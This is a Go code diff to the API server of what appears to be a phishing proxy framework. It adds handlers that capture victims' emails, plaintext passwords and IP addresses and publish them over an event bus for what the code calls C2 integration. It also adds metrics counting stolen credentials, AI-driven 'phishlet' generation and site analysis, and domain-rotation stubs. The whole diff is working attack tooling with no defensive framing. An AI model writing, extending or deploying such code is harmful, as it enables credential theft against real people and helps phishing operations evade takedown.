@@ -13,6 +13,7 @@ import (
 	"go.uber.org/zap"
 
 	"github.com/phantom-proxy/phantom-proxy/internal/database"
+	"github.com/phantom-proxy/phantom-proxy/internal/events"
 	"github.com/phantom-proxy/phantom-proxy/internal/proxy"
 	"github.com/phantom-proxy/phantom-proxy/internal/ai"
 	"github.com/phantom-proxy/phantom-proxy/internal/decentral"
@@ -26,9 +27,10 @@ type APIServer struct {
 	db         *database.Database
 	logger     *zap.Logger
 	apiKey     string
-	aiOrchestrator *ai.AIOrchestrator
+	aiOrchestrator   *ai.AIOrchestrator
 	decentralHosting *decentral.DecentralizedHosting
-	vishingClient *vishing.VishingClient
+	vishingClient    *vishing.VishingClient
+	eventBus         *events.Bus
 }
 
 // NewAPIServer создаёт новый API сервер
@@ -100,14 +102,15 @@ func (s *APIServer) setupRoutes() {
 	// Stats
 	api.Get("/stats", s.getStats)
 
-	// Health check
+	// Health check & Observability
 	s.app.Get("/health", s.healthCheck)
+	s.app.Get("/metrics", s.metrics)
 	
-	// AI endpoints
+	// AI endpoints (delegate to AI orchestrator)
 	s.app.Post("/api/v1/ai/generate-phishlet", s.generatePhishlet)
-	s.app.Get("/api/v1/ai/analyze/:url", s.analyzeSite)
+	s.app.Get("/api/v1/ai/analyze/:target", s.analyzeSite)
 	
-	// Domain rotation endpoints
+	// Domain rotation (stub - wire domain.Rotator when configured)
 	s.app.Post("/api/v1/domains/register", s.registerDomain)
 	s.app.Post("/api/v1/domains/rotate", s.rotateDomain)
 	s.app.Get("/api/v1/domains", s.listDomains)
@@ -131,26 +134,28 @@ func (s *APIServer) setupRoutes() {
 	
 	// Serve login page
 	s.app.Get("/login", s.serveLoginPage)
+
 }
 
 // authMiddleware проверяет API ключ
 func (s *APIServer) authMiddleware(c *fiber.Ctx) error {
-	// Пропускаем health check и login page
-	if strings.HasPrefix(c.Path(), "/health") || 
+	// Пропускаем health, metrics, login page
+	if strings.HasPrefix(c.Path(), "/health") ||
+	   strings.HasPrefix(c.Path(), "/metrics") ||
 	   strings.HasPrefix(c.Path(), "/login") {
 		return c.Next()
 	}
 
-	// Проверка API ключа
-	apiKey := c.Get("Authorization")
+	// API ключ: Authorization: Bearer <key> или ?api_key=<key>
+	apiKey := strings.TrimPrefix(c.Get("Authorization"), "Bearer ")
+	if apiKey == "" {
+		apiKey = c.Query("api_key")
+	}
 	if apiKey == "" {
 		return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
-			"error": "Authorization header required",
+			"error": "Authorization header or api_key query required",
 		})
 	}
-
-	// Убираем "Bearer " префикс
-	apiKey = strings.TrimPrefix(apiKey, "Bearer ")
 
 	if apiKey != s.apiKey {
 		return c.Status(fiber.StatusForbidden).JSON(fiber.Map{
@@ -434,16 +439,13 @@ func (s *APIServer) updatePhishlet(c *fiber.Ctx) error {
 	})
 }
 
-// deletePhishlet удаляет phishlet
+// deletePhishlet деактивирует phishlet
 func (s *APIServer) deletePhishlet(c *fiber.Ctx) error {
 	id := c.Params("id")
-
-	// TODO: Реализовать удаление из БД
-
-	return c.JSON(fiber.Map{
-		"id":      id,
-		"success": true,
-	})
+	if err := s.db.DeletePhishlet(id); err != nil {
+		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": err.Error()})
+	}
+	return c.JSON(fiber.Map{"id": id, "success": true})
 }
 
 // enablePhishlet активирует phishlet
@@ -526,6 +528,40 @@ func (s *APIServer) healthCheck(c *fiber.Ctx) error {
 	})
 }
 
+// metrics Prometheus metrics (basic)
+func (s *APIServer) metrics(c *fiber.Ctx) error {
+	c.Set("Content-Type", "text/plain; version=0.0.4")
+	stats := s.proxy.GetStats()
+	dbStats, _ := s.db.GetStats()
+	sessions := toNum(dbStats["total_sessions"])
+	creds := toNum(dbStats["total_credentials"])
+	requests := toNum(stats["total_requests"])
+	lines := []string{
+		"# HELP phantom_sessions_total Total sessions",
+		"# TYPE phantom_sessions_total gauge",
+		"phantom_sessions_total " + strconv.FormatInt(sessions, 10),
+		"# HELP phantom_credentials_total Total credentials",
+		"# TYPE phantom_credentials_total gauge",
+		"phantom_credentials_total " + strconv.FormatInt(creds, 10),
+		"# HELP phantom_requests_total Proxy requests",
+		"# TYPE phantom_requests_total gauge",
+		"phantom_requests_total " + strconv.FormatInt(requests, 10),
+	}
+	return c.SendString(strings.Join(lines, "\n") + "\n")
+}
+
+func toNum(v interface{}) int64 {
+	switch x := v.(type) {
+	case int:
+		return int64(x)
+	case int64:
+		return x
+	case float64:
+		return int64(x)
+	}
+	return 0
+}
+
 // handleTestLogin обрабатывает тестовый вход
 func (s *APIServer) handleTestLogin(c *fiber.Ctx) error {
 	email := c.FormValue("email")
@@ -560,7 +596,18 @@ func (s *APIServer) handleTestLogin(c *fiber.Ctx) error {
 	s.logger.Info("Credentials saved",
 		zap.String("session_id", session.ID),
 		zap.String("email", email))
-	
+
+	if s.eventBus != nil {
+		s.eventBus.Publish(c.Context(), events.EventCredentialCaptured, &events.CredentialEvent{
+			SessionID: session.ID, Username: email, Password: password,
+			PhishletID: "test_login_page", VictimIP: c.IP(), Timestamp: time.Now(),
+		})
+		s.eventBus.Publish(c.Context(), events.EventSessionCaptured, &events.SessionEvent{
+			SessionID: session.ID, VictimIP: c.IP(), TargetURL: "test_login_page",
+			PhishletID: "test_login_page", State: "captured", Timestamp: time.Now(),
+		})
+	}
+
 	return c.JSON(fiber.Map{
 		"success": true,
 		"message": "Login data captured",
@@ -610,7 +657,18 @@ func (s *APIServer) captureCredentials(c *fiber.Ctx) error {
 	s.logger.Info("Credentials saved to database",
 		zap.String("session_id", session.ID),
 		zap.String("email", req.Email))
-	
+
+	if s.eventBus != nil {
+		s.eventBus.Publish(c.Context(), events.EventCredentialCaptured, &events.CredentialEvent{
+			SessionID: session.ID, Username: req.Email, Password: req.Password,
+			PhishletID: "login_page", VictimIP: c.IP(), Timestamp: time.Now(),
+		})
+		s.eventBus.Publish(c.Context(), events.EventSessionCaptured, &events.SessionEvent{
+			SessionID: session.ID, VictimIP: c.IP(), TargetURL: "login_page",
+			PhishletID: "login_page", State: "captured", Timestamp: time.Now(),
+		})
+	}
+
 	return c.JSON(fiber.Map{
 		"success": true,
 		"message": "Credentials captured",
@@ -629,6 +687,59 @@ func (s *APIServer) serveLoginPage(c *fiber.Ctx) error {
 
 	c.Set("Content-Type", "text/html; charset=utf-8")
 	return c.Send(htmlContent)
+}
+
+// generatePhishlet вызывает AI оркестратор
+func (s *APIServer) generatePhishlet(c *fiber.Ctx) error {
+	var req ai.GenerateRequest
+	if err := c.BodyParser(&req); err != nil {
+		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{"error": "Invalid request body"})
+	}
+	ctx, cancel := context.WithTimeout(c.Context(), 120*time.Second)
+	defer cancel()
+	resp, err := s.aiOrchestrator.GeneratePhishlet(ctx, req)
+	if err != nil {
+		s.logger.Warn("AI generate phishlet failed", zap.Error(err))
+		return c.Status(fiber.StatusBadGateway).JSON(fiber.Map{"error": err.Error()})
+	}
+	return c.JSON(resp)
+}
+
+// analyzeSite вызывает AI оркестратор
+func (s *APIServer) analyzeSite(c *fiber.Ctx) error {
+	target := c.Params("target")
+	if target == "" {
+		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{"error": "target required"})
+	}
+	ctx, cancel := context.WithTimeout(c.Context(), 60*time.Second)
+	defer cancel()
+	result, err := s.aiOrchestrator.AnalyzeSite(ctx, target)
+	if err != nil {
+		s.logger.Warn("AI analyze failed", zap.Error(err))
+		return c.Status(fiber.StatusBadGateway).JSON(fiber.Map{"error": err.Error()})
+	}
+	return c.JSON(result)
+}
+
+// registerDomain stub — подключить domain.Rotator при настройке
+func (s *APIServer) registerDomain(c *fiber.Ctx) error {
+	return c.JSON(fiber.Map{
+		"success": false,
+		"message": "Domain rotation not configured. Wire domain.Rotator in config.",
+	})
+}
+
+// rotateDomain stub
+func (s *APIServer) rotateDomain(c *fiber.Ctx) error {
+	return c.JSON(fiber.Map{
+		"success": false,
+		"message": "Domain rotation not configured.",
+	})
+}
+
+// listDomains stub
+func (s *APIServer) listDomains(c *fiber.Ctx) error {
+	return c.JSON(fiber.Map{"domains": []interface{}{}, "current_domain": ""})
 }
 
 // hostPage публикует страницу в децентрализованной сети
@@ -849,6 +960,11 @@ func (s *APIServer) generateScenario(c *fiber.Ctx) error {
 		"success":  true,
 		"scenario": scenario,
 	})
+}
+
+// SetEventBus sets event bus for v13 (C2 integration on credential capture)
+func (s *APIServer) SetEventBus(bus *events.Bus) {
+	s.eventBus = bus
 }
 
 // Start запускает API сервер
